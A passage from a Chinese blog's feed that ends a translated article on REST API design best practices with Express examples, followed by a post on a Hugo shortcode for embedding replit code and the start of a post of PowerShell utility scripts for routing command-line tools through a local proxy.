<p>这是有意义的，因为评论（<code>comments</code>）是文章的子对象，假设每篇文章都有自己的评论。否则，就会让用户感到困惑，因为这个结构一般被认为是用来访问子对象的。同样的原理也适用于 POST、PUT 和 DELETE 端点。它们的路径名都可以使用同一种嵌套结构。</p>
<h2 id="优雅地处理错误并返回标准的错误代码">优雅地处理错误并返回标准的错误代码</h2>
<p>为了消除 API 用户在发生错误时的困惑，我们应该优雅地处理错误，并返回 HTTP 响应代码，说明发生了什么样的错误。这样可以让 API 的维护者有足够的信息来了解发生的问题。我们不希望错误使我们的系统崩溃，所以我们可以不处理它们，这意味着 API 消费者必须处理它们。</p>
<p>常见的错误 HTTP 状态码包括：</p>
<ul>
<li>400 Bad Request - 这意味着客户端的输入没有通过验证。</li>
<li>401 Unauthorized - 这意味着用户没有被授权访问资源。它通常在用户未认证时返回。</li>
<li>403 Forbidden - 这表示用户已通过认证，但不允许访问资源。</li>
<li>404 Not Found - 这表示找不到资源。</li>
<li>500 Internal server error - 这是一个通用的服务器错误。它可能不应该被明确地抛出。</li>
<li>502 <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/502">Bad Gateway</a> - 这表示上游服务器发来了无效响应。</li>
<li>503 Service Unavailable - 这表示在服务器端发生了一些意想不到的事情（可能是任何事情，比如服务器过载，系统的某些部分失效，等等）。</li>
</ul>
<p>我们抛出的错误应该与我们的应用所遇到的问题相对应。例如，如果我们想拒绝请求 payload 中的数据，那么我们应该在 Express API 中返回一个 400 响应，如下所示：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;express&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">bodyParser</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;body-parser&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// 用户已存在
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">users</span> <span style="color:#f92672">=</span> [{ <span style="color:#a6e22e">email</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;abc@foo.com&#34;</span> }];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">bodyParser</span>.<span style="color:#a6e22e">json</span>());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#34;/users&#34;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">email</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">userExists</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">users</span>.<span style="color:#a6e22e">find</span>((<span style="color:#a6e22e">u</span>) =&gt; <span style="color:#a6e22e">u</span>.<span style="color:#a6e22e">email</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">email</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">userExists</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">400</span>).<span style="color:#a6e22e">json</span>({ <span style="color:#a6e22e">error</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;User already exists&#34;</span> });
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>);
</span></span><span style="display:flex;"><span>});
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#ae81ff">3000</span>, () =&gt; <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;server started&#34;</span>));
</span></span></code></pre></div><p>在上面的代码中，我们在 <code>user</code> 数组中有一个现有用户列表，包含了给定的电子邮件。</p>
<p>那么如果我们尝试用已经存在于 <code>users</code> 中的 <code>email</code> 值来提交 payload，我们会得到一个 400 响应状态码，并附上 <code>'User already exists'</code> 的信息，让用户知道该用户已经存在。有了这些信息，用户可以将邮件改成数据库中尚不存在的邮件来纠正操作。</p>
<p>错误代码需要有信息伴随，这样维护者就有足够的信息来解决问题，但攻击者不能利用错误内容来进行我们的攻击，比如窃取信息或使系统瘫痪。</p>
<p>每当我们的 API 没有成功完成时，我们应该优雅地失败，发送一个带有信息的错误，以帮助用户做出纠正措施。</p>
<h2 id="支持过滤排序和分页">支持过滤、排序和分页</h2>
<p>REST API 背后的数据库可能变得非常庞大。有时候，数据太多，不应该一次全部返回，因为太慢了，或者会让我们的系统崩溃。因此，我们需要有办法来过滤项目。</p>
<p>我们还需要对数据进行分页的方法，这样我们就能一次只返回几个结果。我们不希望因为一个请求，而占用资源太长时间。</p>
<p>过滤和分页都可以通过减少服务器资源的使用来提高性能。随着数据库中积累的数据越多，这些功能就越发重要。</p>
<p>这里有一个小例子，API 可以接受一个带有各种查询参数的查询字符串，让我们通过字段过滤出项目：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;express&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">bodyParser</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;body-parser&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// 数据库中的 employees 数据
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">employees</span> <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>  { <span style="color:#a6e22e">firstName</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Jane&#34;</span>, <span style="color:#a6e22e">lastName</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Smith&#34;</span>, <span style="color:#a6e22e">age</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">20</span> },
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">//...
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  { <span style="color:#a6e22e">firstName</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;John&#34;</span>, <span style="color:#a6e22e">lastName</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Smith&#34;</span>, <span style="color:#a6e22e">age</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">30</span> },
</span></span><span style="display:flex;"><span>  { <span style="color:#a6e22e">firstName</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Mary&#34;</span>, <span style="color:#a6e22e">lastName</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Green&#34;</span>, <span style="color:#a6e22e">age</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">50</span> },
</span></span><span style="display:flex;"><span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">bodyParser</span>.<span style="color:#a6e22e">json</span>());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;/employees&#34;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">firstName</span>, <span style="color:#a6e22e">lastName</span>, <span style="color:#a6e22e">age</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">results</span> <span style="color:#f92672">=</span> [...<span style="color:#a6e22e">employees</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">firstName</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">results</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">results</span>.<span style="color:#a6e22e">filter</span>((<span style="color:#a6e22e">r</span>) =&gt; <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">firstName</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">firstName</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">lastName</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">results</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">results</span>.<span style="color:#a6e22e">filter</span>((<span style="color:#a6e22e">r</span>) =&gt; <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">lastName</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">lastName</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">age</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">results</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">results</span>.<span style="color:#a6e22e">filter</span>((<span style="color:#a6e22e">r</span>) =&gt; <span style="color:#f92672">+</span><span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">age</span> <span style="color:#f92672">===</span> <span style="color:#f92672">+</span><span style="color:#a6e22e">age</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>(<span style="color:#a6e22e">results</span>);
</span></span><span style="display:flex;"><span>});
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#ae81ff">3000</span>, () =&gt; <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;server started&#34;</span>));
</span></span></code></pre></div><p>在上面的代码中，我们通过 <code>req.query</code> 变量来获取查询参数。然后，我们通过使用 JavaScript 解构语法将各个查询参数解构为变量，以提取属性值。最后，我们用每个查询参数值运行 <code>filter</code> 来定位我们想要返回的项目。</p>
<p>一旦我们完成了这些工作，我们就将 <code>results</code> 作为响应返回。因此，当我们用查询字符串向以下路径发出 GET 请求时</p>
<pre tabindex="0"><code>/employees?lastName=Smith&amp;age=30
</code></pre><p>我们得到</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>[
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;firstName&#34;</span>: <span style="color:#e6db74">&#34;John&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;lastName&#34;</span>: <span style="color:#e6db74">&#34;Smith&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;age&#34;</span>: <span style="color:#ae81ff">30</span>
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>]
</span></span></code></pre></div><p>作为返回的响应，因为我们是按 <code>lastName</code> 和 <code>age</code> 过滤的。</p>
<p>同样，我们也可以接受 <code>page</code> 查询参数，并返回一组从 <code>(page - 1) * 20</code> 到 <code>page * 20</code> 位置的条目。</p>
<p>我们还可以在查询字符串中指定要排序的字段。例如，我们可以从查询字符串中获取参数，其中包含我们要对数据进行排序的字段。然后，我们可以按照这些单独的字段进行排序。</p>
<p>例如，我们可能想从一个 URL 中提取查询字符串，比如。</p>
<pre tabindex="0"><code>http://example.com/articles?sort=+author,-datepublished
</code></pre><p>其中 <code>+</code> 表示升序，<code>-</code> 表示降序。因此，我们按照作者姓名的字母顺序和 <code>datepublished</code> 从最新的到最旧的排序。</p>
<h2 id="保持良好的安全实践">保持良好的安全实践</h2>
<p>客户端和服务器之间的大部分通信应该是私密的，因为我们经常发送和接收私人信息。因此，使用 SSL/TLS 来保证安全是必须的。</p>
<p>SSL 证书加载到服务器上并不难，而且其是免费或花费很少的。我们应使我们的 REST API 通过安全通道，而不是在公开地通信。</p>
<p>人们不应该能够访问到他们所请求的信息之外的信息。例如，一个普通用户不应该能够访问另一个用户的信息。他们也不应该能够访问管理员的数据。</p>
<p>为了执行最小权限原则，我们需要添加角色检查，或者针对单一角色，或者为每个用户设置更细的角色。</p>
<p>如果我们选择把用户分成几个角色群，那么这些角色的权限应该覆盖他们所需要的所有权限，而不是更多。如果我们对每个用户可以访问的功能有更细化的权限，那么我们要确保管理员可以相应地添加和删除每个用户的这些功能。另外，我们还需要添加一些预设的角色，可以应用于一组用户，这样我们就不必对每个用户都手动操作了。</p>
<h2 id="缓存数据以提高性能">缓存数据以提高性能</h2>
<p>我们可以添加缓存，从本地内存缓存中返回数据，而不是每次要检索用户请求的一些数据时，都要查询数据库。缓存的好处是，用户可以更快的获得数据。但是，用户得到的数据可能是过时的。这也可能导致在生产环境中调试时出现问题，因为我们一直看到旧的数据。</p>
<p>缓存解决方案有很多种，比如 <a href="https://redis.io/">Redis</a>、内存缓存等等。我们可以随着需求的变化，改变数据的缓存方式。</p>
<p>例如，Express 有 <a href="https://www.npmjs.com/package/apicache">apicache</a> 中间件，不需要太多的配置就可以为我们的应用添加缓存功能。我们可以像这样在服务器中添加一个简单的内存缓存。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;express&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">bodyParser</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;body-parser&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">apicache</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;apicache&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>();
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">cache</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">apicache</span>.<span style="color:#a6e22e">middleware</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">cache</span>(<span style="color:#e6db74">&#34;5 minutes&#34;</span>));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// 数据库中的 employees 数据
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">employees</span> <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>  { <span style="color:#a6e22e">firstName</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Jane&#34;</span>, <span style="color:#a6e22e">lastName</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Smith&#34;</span>, <span style="color:#a6e22e">age</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">20</span> },
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">//...
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  { <span style="color:#a6e22e">firstName</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;John&#34;</span>, <span style="color:#a6e22e">lastName</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Smith&#34;</span>, <span style="color:#a6e22e">age</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">30</span> },
</span></span><span style="display:flex;"><span>  { <span style="color:#a6e22e">firstName</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Mary&#34;</span>, <span style="color:#a6e22e">lastName</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Green&#34;</span>, <span style="color:#a6e22e">age</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">50</span> },
</span></span><span style="display:flex;"><span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">bodyParser</span>.<span style="color:#a6e22e">json</span>());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;/employees&#34;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>(<span style="color:#a6e22e">employees</span>);
</span></span><span style="display:flex;"><span>});
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#ae81ff">3000</span>, () =&gt; <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;server started&#34;</span>));
</span></span></code></pre></div><p>上面的代码只是用 <code>apicache.middleware</code> 来引用 <code>apicache</code> 中间件，然后我们用:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">cache</span>(<span style="color:#e6db74">&#34;5 minutes&#34;</span>));
</span></span></code></pre></div><p>来将缓存应用于整个应用。比如说，我们将结果缓存 5 分钟。我们可以根据自己的需要调整。</p>
<h2 id="版本化我们的-api">版本化我们的 API</h2>
<p>如果我们要对 API 进行任何可能破坏客户端的修改，我们便应有不同的版本。版本划分可以像现在大多数应用一样，根据语义版本进行（例如，2.0.6 表示主要版本 2 和第 6 个补丁）。</p>
<p>这样一来，我们可以逐步淘汰旧的端点，而不是强迫大家同时转移到新的 API 上。v1 端点可以为那些不想改变的人保持活跃，而 v2 则可以凭借其闪亮的新功能为那些准备升级的人服务。如果我们的 API 是公开的，这一点尤其重要。我们应该对它们进行版本调整，这样就不会破坏使用我们 API 的第三方应用。</p>
<p>版本化通常是在 API 路径的开头加上 <code>/v1/</code>、<code>/v2/</code> 等。</p>
<p>例如，我们可以对 Express 进行如下操作。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;express&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">bodyParser</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;body-parser&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>();
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">bodyParser</span>.<span style="color:#a6e22e">json</span>());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;/v1/employees&#34;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">employees</span> <span style="color:#f92672">=</span> [];
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// 获取 employees 的代码
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>(<span style="color:#a6e22e">employees</span>);
</span></span><span style="display:flex;"><span>});
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;/v2/employees&#34;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">employees</span> <span style="color:#f92672">=</span> [];
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// 另一些获取 employees 的代码
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>(<span style="color:#a6e22e">employees</span>);
</span></span><span style="display:flex;"><span>});
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#ae81ff">3000</span>, () =&gt; <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;server started&#34;</span>));
</span></span></code></pre></div><p>我们只需将版本号添加到端点 URL 路径的开头，就可以对它们进行版本控制。</p>
<h2 id="结束语">结束语</h2>
<p>设计高质量的 REST API 最重要的思考是，通过遵循 Web 标准和约定来获取一致性。JSON、SSL/TLS 和 HTTP 状态码都是现代网络的标准构件。</p>
<p>性能也是一个重要的考虑因素。我们可以通过不一次性返回太多数据来提高它的性能。此外，我们还可以使用缓存，这样我们就不必一直查询数据。</p>
<p>端点的路径应该是一致的，我们只使用名词，因为 HTTP 方法表示我们要采取的行动。嵌套资源的路径应该在父资源的路径之后。它们应该告诉我们，我们正在获取或操作什么，而非我们需要阅读额外的文档来理解它在做什么。</p>
]]></content><category scheme="https://blog.batkiz.com/tags/%E7%BF%BB%E8%AF%91" term="%E7%BF%BB%E8%AF%91" label="翻译"/><category scheme="https://blog.batkiz.com/tags/stackoverflow" term="stackoverflow" label="stackoverflow"/></entry><entry><title type="html">博客主题新功能：repl 代码集成</title><link href="https://blog.batkiz.com/posts/theme-new-feat-repl-embed/?utm_source=atom_feed" rel="alternate" type="text/html"/><id>https://blog.batkiz.com/posts/theme-new-feat-repl-embed/</id><published>2020-09-06T13:30:29+08:00</published><updated>2020-09-06T13:30:29+08:00</updated><content type="html"><![CDATA[<p>由于 hugo 自 v0.60 之后默认忽略 raw html，所以为了便捷地使用 repl 的 embed code share 功能，我就写了个 shortcode。</p>
<h2 id="效果测试">效果测试</h2>
<h2 id="使用方法">使用方法</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>{{&lt; repl &#34;batkiz/hello-repl&#34; &gt;}}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>/*
</span></span><span style="display:flex;"><span>batkiz -&gt; username(不带 `@`)
</span></span><span style="display:flex;"><span>hello-repl -&gt; repl name
</span></span><span style="display:flex;"><span>*/
</span></span></code></pre></div><p>具体的代码则可以去我主题的代码仓库瞅一眼（毕竟非常简单）</p>
<hr>
<p>2021/05 更新：</p>
<p><a href="https://replit.com/talk/ask/My-share-button-is-missing/138229">repl 已不提供 iframe 嵌入形式的分享选项</a>，不过所幸还没被 ban 掉，官方提供的 iframe 嵌入代码如下所示：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;embed repl&#34;</span>&gt;
</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">iframe</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;repl&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;400px&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;100%&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://repl.it/@batkiz/hello-repl?lite=true&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">scrolling</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;no&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">frameborder</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;no&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">allowtransparency</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;true&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">allowfullscreen</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;true&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sandbox</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;allow-forms allow-pointer-lock allow-popups allow-same-origin allow-scripts allow-modals&#34;</span>
</span></span><span style="display:flex;"><span>  &gt;
</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">iframe</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">div</span>&gt;
</span></span></code></pre></div><p>只需将 <code>@batkiz/hello-repl</code> 换成你想要的用户名/repl 名。</p>
]]></content></entry><entry><title type="html">一些 powershell 脚本 | 其二</title><link href="https://blog.batkiz.com/posts/some-pwsh-scripts-2/?utm_source=atom_feed" rel="alternate" type="text/html"/><link href="https://blog.batkiz.com/posts/pwsh-headers-and-messy-code/?utm_source=atom_feed" rel="related" type="text/html" title="powershell, headers 与乱码"/><link href="https://blog.batkiz.com/posts/some-pwsh-scripts/?utm_source=atom_feed" rel="related" type="text/html" title="一些 powershell 脚本"/><link href="https://blog.batkiz.com/posts/oh-my-powershell/?utm_source=atom_feed" rel="related" type="text/html" title="oh my powershell"/><id>https://blog.batkiz.com/posts/some-pwsh-scripts-2/</id><published>2020-08-31T12:57:22+08:00</published><updated>2020-08-31T12:57:22+08:00</updated><content type="html"><![CDATA[<p>承接<a href="/posts/2020/some-pwsh-scripts/">前文</a>，这里是另一些可能有点用的 pwsh 脚本。</p>
<h2 id="命令行代理">命令行代理</h2>
<p>让命令行应用走代理，用法是 <code>socks app command</code>。也可以把 <code>Set-CliProxy</code> 与 <code>Clear-CliProxy</code> 单独拿出来用。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> socks {
</span></span><span style="display:flex;"><span>    $Command = <span style="color:#e6db74">&#34;</span>$args<span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Set-CliProxy
</span></span><span style="display:flex;"><span>    Invoke-Expression $Command <span style="color:#ae81ff">2</span>&gt;&amp;<span style="color:#ae81ff">1</span> | out-default
</span></span><span style="display:flex;"><span>    Clear-CliProxy
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> Set-CliProxy {
</span></span><span style="display:flex;"><span>    $proxy = <span style="color:#e6db74">&#39;http://127.0.0.1:43333&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    $env:HTTP_PROXY = $proxy
</span></span><span style="display:flex;"><span>    $env:HTTPS_PROXY = $proxy
